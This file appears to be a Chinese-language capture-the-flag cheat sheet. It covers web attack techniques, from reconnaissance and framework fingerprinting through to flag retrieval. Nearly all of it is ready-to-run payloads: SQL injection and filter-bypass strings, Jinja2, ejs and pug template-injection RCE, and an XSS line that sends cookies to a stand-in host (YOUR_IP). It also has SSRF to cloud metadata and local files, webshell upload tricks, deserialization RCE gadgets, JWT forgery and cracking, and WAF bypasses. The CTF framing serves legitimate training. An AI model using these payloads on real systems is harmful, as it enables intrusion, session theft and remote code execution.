---
name: ctf-web-manual
description: Web手工测试checklist：侦察/指纹/SQLi/XSS/SSRF/SSTI/上传/反序列化/IDOR/JWT/绕过/Flag路径
category: web
---

## 快速侦察
```
curl -sk {URL}/ -D- | head -30                    # 响应头+技术栈
curl -sk {URL}/robots.txt                          # 路径泄露
curl -sk {URL}/.git/HEAD                           # Git泄露
curl -sk {URL}/.git/config                         # Git远程仓库
curl -sk {URL}/.env                                # 环境变量
curl -sk {URL}/actuator/env                        # Spring泄露
curl -sk {URL}/console                             # Flask debug
curl -sk {URL}/swagger-ui.html                     # Swagger文档
curl -sk {URL}/graphql?query={__schema{types{name}}} # GraphQL自省
curl -sk {URL}/wp-json/wp/v2/users                 # WordPress用户枚举
```

## 框架指纹识别
| 特征 | 框架 | 下一步 |
|------|------|--------|
| Server: Werkzeug / debug PIN页面 | Flask | /console PIN计算, SSTI, config泄露 |
| X-Powered-By: Express | Node/Express | prototype pollution, SSTI(ejs/pug) |
| JSESSIONID / .action/.do | Java/Spring/Struts | 反序列化, OGNL注入, actuator |
| PHPSESSID / X-Powered-By: PHP | PHP | 文件包含, 反序列化, disable_functions绕过 |
| csrftoken + admin/ | Django | DEBUG=True泄露, ORM注入 |
| __viewstate | ASP.NET | ViewState反序列化, 短文件名 |
| laravel_session | Laravel | APP_KEY泄露→反序列化RCE |
## SQLi
```
curl -sk "{URL}/login" -d "user=admin'--&pass=x"                     # 登录绕过
curl -sk "{URL}/api?id=1' UNION SELECT 1,2,3--"                      # Union注入
curl -sk "{URL}/api?id=1' AND SLEEP(3)--"                            # 盲注确认(观察延迟)
curl -sk "{URL}/api?id=1' AND extractvalue(1,concat(0x7e,version()))--"  # 报错注入
curl -sk "{URL}/api?id=1' UNION SELECT 1,load_file('/flag'),3--"     # 读文件
```
过滤绕过：`/**/`替空格, `UnIoN`大小写混写, `0x`hex编码, 双写`selselectect`

## SSTI
```
curl -sk "{URL}/render?name={{7*7}}"               # Jinja2: 返回49
curl -sk "{URL}/render?name={{config}}"             # Flask config泄露
curl -sk "{URL}/render?name=#{7*7}"                # Thymeleaf
curl -sk "{URL}/render?name=${7*7}"                # FreeMarker/Velocity
```
Jinja2 RCE: `{{lipsum.__globals__['os'].popen('cat /flag').read()}}`
无`_`绕过: `{{lipsum|attr('\x5f\x5fglobals\x5f\x5f')}}`

## XSS → Cookie/Flag
```
# 反射型确认
curl -sk "{URL}/search?q=<script>alert(1)</script>"
# 存储型：留言/评论框写入 → admin bot触发
<img src=x onerror="fetch('http://YOUR_IP/?c='+document.cookie)">
```
常见绕过：`<img src=x onerror=...>`, `<svg/onload=...>`, `javascript:` URL

## SSRF
```
curl -sk "{URL}/fetch?url=http://127.0.0.1:8080"
curl -sk "{URL}/fetch?url=http://169.254.169.254/latest/meta-data/"  # 云元数据
curl -sk "{URL}/fetch?url=file:///etc/passwd"
curl -sk "{URL}/fetch?url=file:///flag"
curl -sk "{URL}/fetch?url=http://0x7f000001/"      # IP绕过
curl -sk "{URL}/fetch?url=http://0177.0.0.1/"      # 八进制绕过
curl -sk "{URL}/fetch?url=gopher://127.0.0.1:6379/_*1%0d%0a..."  # 打Redis
```
## 文件上传/包含
```
curl -sk "{URL}/upload" -F "file=@shell.php;type=image/png"          # MIME伪造
curl -sk "{URL}/upload" -F "file=@shell.php.jpg"                     # 双扩展名
curl -sk "{URL}/upload" -F "file=@shell.phtml"                       # 备选扩展
curl -sk "{URL}/upload" -F "file=@shell.php%00.jpg"                  # 截断(旧PHP)
```
备选扩展：.phtml .phar .php3 .php5 .shtml .jsp .jspx .war
验证上传后：访问返回路径确认是否可执行，`curl -sk {URL}/uploads/shell.php?cmd=cat+/flag`
文件包含：`?page=php://filter/convert.base64-encode/resource=index`, `?page=data://text/plain,<?php system('cat /flag');?>`

## 反序列化
```
# Java: ysoserial
java -jar ysoserial.jar CommonsCollections1 "cat /flag" | base64
# PHP: unserialize → POP链
O:4:"User":1:{s:4:"name";s:6:"whoami";}
# Python: pickle → __reduce__
import pickle,os; pickle.dumps(type('X',(),{'__reduce__':lambda s:( os.system,('cat /flag',))})())
# Node: node-serialize → IIFE
{"cmd":"_$$ND_FUNC$$_function(){require('child_process').exec('cat /flag')}()"}
```

## JWT攻击
```
# 解码（不需要密钥）
echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null
# alg:none绕过
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' → 拼接payload.
# 弱密钥爆破
hashcat -m 16500 jwt.txt rockyou.txt
john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256
# RS256→HS256混淆：用公钥作HS256密钥签名
```

## IDOR / 越权
```
curl -sk "{URL}/api/user/1" -H "Cookie: ..."       # 改ID遍历
curl -sk "{URL}/api/user/2" -H "Cookie: ..."       # 对比响应差异
curl -sk "{URL}/api/admin/flag" -H "Cookie: user_cookie"  # 垂直越权
```
测试思路：改ID/UUID → 改角色字段(role=admin) → 改HTTP方法(GET→PUT) → 去掉鉴权头

## 常见绕过技巧
| 目标 | 绕过方式 |
|------|---------|
| WAF关键词 | 大小写/双写/编码(%27)/注释(/**/) |
| 路径过滤 | ../被过滤→....//或..%2f或..;/ |
| IP黑名单 | 0x7f000001/0177.1/127.1/[::]/ DNS rebinding |
| 文件类型 | Content-Type伪造/双扩展名/00截断 |
| CSP | JSONP回调/CDN域名下的gadget/base标签劫持 |
| disable_functions | LD_PRELOAD/FFI/COM/.so加载/mail() |

## Flag获取路径
```
# RCE后标准检查
cat /flag* /home/*/flag* /etc/flag* 2>/dev/null
env | grep -i flag
find / -name "*flag*" 2>/dev/null
# 数据库
mysql -e "SELECT * FROM flag;" 2>/dev/null
sqlite3 *.db "SELECT * FROM flag;" 2>/dev/null
# 源码泄露恢复
git log --all --oneline   # .git泄露后找历史flag
git diff HEAD~1           # 对比历史提交
# Redis
redis-cli -h 127.0.0.1 KEYS "*flag*"
redis-cli -h 127.0.0.1 GET flag
```

## Python框架速查
```
# Flask DEBUG PIN计算（需泄露machine-id+mac+modname）
# /proc/sys/kernel/random/boot_id + /proc/self/cgroup → machine-id
# uuid.getnode() → MAC → /sys/class/net/eth0/address
# PIN = Werkzeug PIN算法(modname='flask.app', appname='Flask', ...)

# Django DEBUG=True → /路径报错泄露源码路径
# settings.py SECRET_KEY → session伪造
```

## Node.js速查
```
# prototype pollution: {"__proto__":{"isAdmin":true}}
# ejs SSTI: <%- global.process.mainModule.require('child_process').execSync('cat /flag') %>
# pug SSTI: #{function(){return global.process.mainModule.require('child_process').execSync('cat /flag')}()}
# require劫持：覆盖package.json/node_modules内模块
```
